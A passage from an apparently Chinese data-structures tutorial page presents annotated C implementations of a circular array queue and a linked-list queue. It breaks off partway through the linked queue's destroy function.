循环队列</h2><p><strong>翔哥代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 循环队列为空：Q.rear=Q.front</span></span><br><span class="line"><span class="comment">//2. 循环队列满：Q.front=(Q.rear+1)   %   maxsize</span></span><br><span class="line"><span class="comment">//3. 求循环队列长度 (Q.rear-Q.front+maxsize)%maxsize</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  文件名：SeqQueue.c</span></span><br><span class="line"><span class="comment"> *  循环队列的实现</span></span><br><span class="line"><span class="comment"> *  版本：1.0</span></span><br><span class="line"><span class="comment"> *  时间：2016.06.26</span></span><br><span class="line"><span class="comment"> *  作者：wangx</span></span><br><span class="line"><span class="comment"> *  假定条件： 假设元素的基本类型为整数int</span></span><br><span class="line"><span class="comment"> *          </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//代码3. ---------顺序结构下的循环队列基本结构定义代码---------//</span></span><br><span class="line"><span class="comment">//文件名：SeqQueue.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"malloc.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXQSIZE 10        <span class="comment">//假定数组长度为10</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> QElemType;     <span class="comment">//假定队列元素为比较简单的int型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType *base; <span class="comment">//注意，连续存储空间需要在函数中动态申请，此处只是定义了指向该空间的指针</span></span><br><span class="line">    <span class="keyword">int</span> front; <span class="comment">//队头指针,若队列不空,指向队列头元素的下标</span></span><br><span class="line">    <span class="keyword">int</span> rear;  <span class="comment">//队尾指针,若队列不空,指向队列尾元素的下一个空位下标</span></span><br><span class="line">&#125;SeqQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------顺序结构下的“创建并初始化一个队列”操作算法代码---------//</span></span><br><span class="line"><span class="comment">//文件名：SeqQueue.c</span></span><br><span class="line"><span class="comment">//因为涉及到可能更改指向队列的指针值，所以采用二重指针ppQ为参数，以便返回</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InitQueue</span><span class="params">(SeqQueue **ppQ)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="comment">//创建循环队列的基本结构，诞生base、front和rear</span></span><br><span class="line">    *ppQ= (SeqQueue *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SeqQueue));</span><br><span class="line">    <span class="keyword">if</span> (!*ppQ) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//创建循环队列的数组载体结构，诞生base指向的数组空间</span></span><br><span class="line">    (*ppQ)-&gt;base=(QElemType *)<span class="built_in">malloc</span>(MAXQSIZE*<span class="keyword">sizeof</span>(QElemType));</span><br><span class="line">    <span class="keyword">if</span>(!(*ppQ)-&gt;base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(*ppQ);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//front和rear相等，初始化设其都为0（也可以不从0开始）</span></span><br><span class="line">    (*ppQ)-&gt;front=(*ppQ)-&gt;rear=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------顺序结构下的“队列销毁”操作算法代码---------//</span></span><br><span class="line"><span class="comment">//文件名：SeqQueue.c</span></span><br><span class="line"><span class="comment">//因为涉及到可能更改指向队列的指针值，所以采用二重指针ppQ为参数，以便返回</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DestroyQueue</span><span class="params">(SeqQueue **ppQ)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">/* 销毁队列Q,Q不再存在 */</span></span><br><span class="line">   <span class="keyword">if</span>((*ppQ)-&gt;base)</span><br><span class="line">     <span class="built_in">free</span>((*ppQ)-&gt;base);</span><br><span class="line">   <span class="keyword">if</span>(*ppQ)</span><br><span class="line">     <span class="built_in">free</span>(*ppQ);</span><br><span class="line">   *ppQ= <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------顺序结构下的“清空队列”操作算法代码---------//</span></span><br><span class="line"><span class="comment">//文件名：SeqQueue.c</span></span><br><span class="line"><span class="comment">//函数要求队列本身是已存在的</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ClearQueue</span><span class="params">(SeqQueue *pQ)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pQ==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    pQ-&gt;front=pQ-&gt;rear=<span class="number">0</span>;    <span class="comment">//注意，并不需要对数组中已存在的元素置为0或空</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------顺序结构下的“判断队列是否为空”操作算法代码---------//</span></span><br><span class="line"><span class="comment">//文件名：SeqQueue.c</span></span><br><span class="line"><span class="comment">//函数要求队列本身是已存在的，否则返回-1</span></span><br><span class="line"><span class="comment">//若队列pQ为空队列,则返回1,否则返回0</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueIsEmpty</span><span class="params">(SeqQueue *pQ)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pQ== <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(pQ-&gt;front==pQ-&gt;rear) <span class="comment">/* 队列空的标志 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------顺序结构下的"获取队列元素个数"操作算法代码---------//</span></span><br><span class="line"><span class="comment">//文件名：SeqQueue.c</span></span><br><span class="line"><span class="comment">//函数要求队列本身是已存在的，否则返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetQueueLength</span><span class="params">(SeqQueue *pQ)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">    <span class="keyword">if</span> (pQ== <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//循环队列中，rear的值有可能会小于front，故要加个MAXQSIZE再来取余</span></span><br><span class="line">    length= (pQ-&gt;rear-pQ-&gt;front+MAXQSIZE)%MAXQSIZE;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------顺序结构下的"获取队头元素的值"操作算法代码---------//</span></span><br><span class="line"><span class="comment">//文件名：SeqQueue.c</span></span><br><span class="line"><span class="comment">//队列为空或者队列不存在，均返回-1，否则将队头元素的值存储到地址为pe的空间中，并返回0</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetHead</span><span class="params">(SeqQueue *pQ,QElemType *pe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pQ== <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* 若队列不空,则用e返回Q的队头元素,并返回0,否则返回-1 */</span></span><br><span class="line">    <span class="keyword">if</span>(pQ-&gt;front==pQ-&gt;rear) <span class="comment">/* 队列空 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    *pe=pQ-&gt;base[pQ-&gt;front];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------顺序结构下的"进队列"操作算法代码---------//</span></span><br><span class="line"><span class="comment">//文件名：SeqQueue.c</span></span><br><span class="line"><span class="comment">//队列不存在，返回-1；队列满，返回-2；正常进队返回0</span></span><br><span class="line"><span class="comment">//注意此时进队元素是普通的值传递方式 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EnQueue</span><span class="params">(SeqQueue *pQ, QElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pQ== <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>((pQ-&gt;rear+<span class="number">1</span>)%MAXQSIZE==pQ-&gt;front) <span class="comment">//如果队列满，产生真上溢，放弃操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    pQ-&gt;base[pQ-&gt;rear]=e;                <span class="comment">//先填值，注意，入队列和front无关</span></span><br><span class="line">    pQ-&gt;rear=(pQ-&gt;rear+<span class="number">1</span>)%MAXQSIZE;      <span class="comment">//再循环加1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------顺序结构下的"出队列"操作算法代码---------//</span></span><br><span class="line"><span class="comment">//文件名：SeqQueue.c</span></span><br><span class="line"><span class="comment">//队列不存在，返回-1；队列空，返回-2；正常出队返回0</span></span><br><span class="line"><span class="comment">//注意此时出队元素pe采用的是参数的地址传递方式   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DeQueue</span><span class="params">(SeqQueue *pQ,QElemType *pe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pQ== <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(pQ-&gt;front==pQ-&gt;rear)              <span class="comment">//如果队列为空，直接放弃操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    *pe=pQ-&gt;base[pQ-&gt;front];             <span class="comment">//先读值，出队列操作与rear无关</span></span><br><span class="line">    pQ-&gt;front=(pQ-&gt;front+<span class="number">1</span>)%MAXQSIZE;    <span class="comment">//再循环加1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SeqQueue *pQ;</span><br><span class="line">    InitQueue(&amp;pQ);</span><br><span class="line">    DestroyQueue(&amp;pQ);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="45-链队列"><a href="#45-链队列" class="headerlink" title="45 链队列"></a>45 链队列</h2><p><strong>翔哥代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  文件名：LinkQueue.c</span></span><br><span class="line"><span class="comment"> *  链队列的实现</span></span><br><span class="line"><span class="comment"> *  版本：1.0</span></span><br><span class="line"><span class="comment"> *  时间：2016.06.26</span></span><br><span class="line"><span class="comment"> *  作者：wangx</span></span><br><span class="line"><span class="comment"> *  假定条件： 假设元素的基本类型为int类型</span></span><br><span class="line"><span class="comment"> *          </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//链队列</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"malloc.h"</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> QElemType;         <span class="comment">//假设队列元素类型为int，读者可更换为其他类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span>          //定义单向链表的结点类型名为<span class="title">QNode</span>，并定义指向</span></span><br><span class="line"><span class="class">&#123;</span>                             <span class="comment">//这种类型的指针的类型名称为QueuePtr</span></span><br><span class="line">    QElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;QNode, *QueuePtr;</span><br><span class="line"><span class="comment">/*将队头指针和队尾指针打包封装，定义出新的结构体类型，</span></span><br><span class="line"><span class="comment">  即链队列的数据类型，取名为LinkQueue</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>                </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QueuePtr front;           <span class="comment">// 队头指针</span></span><br><span class="line">    QueuePtr rear;            <span class="comment">// 队尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------链队列的创建和初始化操作---------//</span></span><br><span class="line"><span class="comment">//文件名：LinkQueue.c</span></span><br><span class="line"><span class="comment">//以指向LinkQueue结构体的二重指针ppQ为参数，在函数内构建B和C部分，实现关联</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InitQueue</span><span class="params">(LinkQueue **ppQ)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    (*ppQ)=(LinkQueue *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkQueue));</span><br><span class="line">    <span class="keyword">if</span>(!(*ppQ))  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    (*ppQ)-&gt;front=(*ppQ)-&gt;rear=(QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!(*ppQ)-&gt;front)  <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    (*ppQ)-&gt;front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------链队列的“判断是否为空”操作---------//</span></span><br><span class="line"><span class="comment">//文件名：LinkQueue.c</span></span><br><span class="line"><span class="comment">//以指向LinkQueue结构体的一重指针pQ为参数</span></span><br><span class="line"><span class="comment">// 如果参数有误，返回-1; 若Q为空队列,则返回1,否则返回0 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueIsEmpty</span><span class="params">(LinkQueue *pQ)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (pQ==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(pQ-&gt;front==pQ-&gt;rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------链队列的“读取队头元素”操作---------//</span></span><br><span class="line"><span class="comment">//文件名：LinkQueue.c</span></span><br><span class="line"><span class="comment">//以指向LinkQueue结构体的一重指针pQ为参数</span></span><br><span class="line"><span class="comment">// 如果队列存在且非空，获取队头元素的值，以地址传递的方式通过e传出；如果参数有误，返回-1;  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetQueueHead</span><span class="params">(LinkQueue *pQ,QElemType *e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(QueueIsEmpty(pQ)!=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    *e=pQ-&gt;front-&gt;next-&gt;data;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------链队列的“入队列”操作---------//</span></span><br><span class="line"><span class="comment">//文件名：LinkQueue.c</span></span><br><span class="line"><span class="comment">//以指向LinkQueue结构体的一重指针pQ为参数</span></span><br><span class="line"><span class="comment">// 如果队列不存在或操作异常，返回负数; 反之，成功操作返回0  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EnQueue</span><span class="params">(LinkQueue *pQ,QElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    QueuePtr R;</span><br><span class="line">    <span class="keyword">if</span> (pQ==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 为新进元素e申请结点空间，并让指针R指向。 </span></span><br><span class="line">    R=(QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!R) <span class="keyword">return</span> <span class="number">-2</span>;          <span class="comment">//内存申请失败，返回-2</span></span><br><span class="line">    R-&gt;data=e;</span><br><span class="line">    R-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//进行入队的指针关联</span></span><br><span class="line">    pQ-&gt;rear-&gt;next=R;</span><br><span class="line">    pQ-&gt;rear=R;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------链队列的“出队列”操作---------//</span></span><br><span class="line"><span class="comment">//文件名：LinkQueue.c</span></span><br><span class="line"><span class="comment">//以指向LinkQueue结构体的一重指针pQ为参数，参数pe为地址传递形式</span></span><br><span class="line"><span class="comment">//将队头元素用指针e返回；若是唯一元素，需调整rear指针</span></span><br><span class="line"><span class="comment">//如果队列不存在或队列为空，返回-1; 反之，成功操作返回0  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DeQueue</span><span class="params">(LinkQueue *pQ,QElemType *pe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QueuePtr R;</span><br><span class="line">    <span class="keyword">if</span> (pQ==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;            <span class="comment">//队列不存在，返回-1</span></span><br><span class="line">    <span class="keyword">if</span>(pQ-&gt;front==pQ-&gt;rear) <span class="keyword">return</span> <span class="number">-2</span>;  <span class="comment">//队列为空，返回-2</span></span><br><span class="line">        </span><br><span class="line">    R=pQ-&gt;front-&gt;next;                  <span class="comment">//令R指向表头后的第一个结点</span></span><br><span class="line">    *pe=R-&gt;data;</span><br><span class="line">    pQ-&gt;front-&gt;next=R-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(pQ-&gt;rear==R)                     <span class="comment">//如果第一个结点也是最后一个结点</span></span><br><span class="line">        pQ-&gt;rear=pQ-&gt;front;</span><br><span class="line">    <span class="built_in">free</span>(R);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------链队列的“求队列长度”操作---------//</span></span><br><span class="line"><span class="comment">//文件名：LinkQueue.c</span></span><br><span class="line"><span class="comment">//以指向LinkQueue结构体的一重指针pQ为参数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetQueueLength</span><span class="params">(LinkQueue *pQ)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QueuePtr p;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    p=pQ-&gt;front;</span><br><span class="line">    <span class="keyword">while</span>(p!=pQ-&gt;rear)</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------链队列的“清空队列”操作---------//</span></span><br><span class="line"><span class="comment">//文件名：LinkQueue.c</span></span><br><span class="line"><span class="comment">//以指向LinkQueue结构体的一重指针pQ为参数</span></span><br><span class="line"><span class="comment">//清空后，front和rear指针均指向表头结点</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ClearQueue</span><span class="params">(LinkQueue *pQ)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">/* 将Q清为空队列 */</span></span><br><span class="line">    QueuePtr p,q;</span><br><span class="line">    <span class="keyword">if</span> (pQ==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    pQ-&gt;rear=pQ-&gt;front;    <span class="comment">//rear指针归位</span></span><br><span class="line">    p=pQ-&gt;front-&gt;next;     <span class="comment">//p指针指向表中第一个数据结点</span></span><br><span class="line">    pQ-&gt;front-&gt;next=<span class="literal">NULL</span>;  <span class="comment">//表头结点的next域归位</span></span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)         <span class="comment">//循环释放每个数据结点的空间</span></span><br><span class="line">    &#123;</span><br><span class="line">        q=p;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//代码3. ---------链队列的销毁操作---------//</span></span><br><span class="line"><span class="comment">//文件名：LinkQueue.c</span></span><br><span class="line"><span class="comment">//以指向LinkQueue结构体的二重指针ppQ为参数</span></span><br><span class="line"><span class="comment">//在函数内先清空队列数据，然后销毁空队列的B、C部分，并归位队列指针</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DestroyQueue</span><span class="params">(LinkQueue **ppQ)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (ClearQueue(*ppQ)==<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">free</span>((*ppQ)-&gt;front);</span><br><span class="line">    <span class="built_in">free</span>(*ppQ);</span><br><span class="line">   